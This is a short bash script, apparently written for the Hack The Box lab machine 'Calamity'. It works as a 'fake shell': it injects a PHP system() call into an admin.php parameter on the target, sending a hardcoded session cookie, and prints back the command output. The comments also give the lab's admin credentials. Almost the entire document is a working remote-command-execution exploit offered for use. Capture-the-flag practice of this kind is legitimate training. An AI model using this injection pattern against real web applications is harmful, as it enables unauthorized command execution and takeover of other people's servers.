#!/bin/bash
# This script is for HTB Calamity
# Work Around for shell auto crashing.
# usage ./fakeshell.sh >>> hit enter >>> enter bash command
# CTRL + c to exit
# Warning: This is a fake shell. You can enumerate a little. You can not navigate with it i.e. cd .., cd, cd~
# You also need to be logged in. username = admin, password = skoupidotenekes, then drag your session cookie into the curl command. 
# The current session cookie is "adminpowa=noonecares"
# To turn this script into a real tty go to github.com/s4vitar/ttyoverhttp
# To get a little more functionilty you can use rlwrap. $ rlwrap ./fakeshell.sh <<< This is still not a real tty shell.

function ctrl_c(){
	echo -e "\n\n[!] Exiting the bash script...\n"
	exit 1
}

# CTRL + C
trap ctrl_c INT

# Global Variables
main_url="http://10.10.10.27/admin.php"

while true; do
	echo -n "[~] " && read -r command
	echo; curl -s -G $main_url --data-urlencode "html=<?php system(\"$command\"); ?>" --cookie "adminpowa=noonecares" | grep "/body" -A 500 | grep -v "/body"; echo
done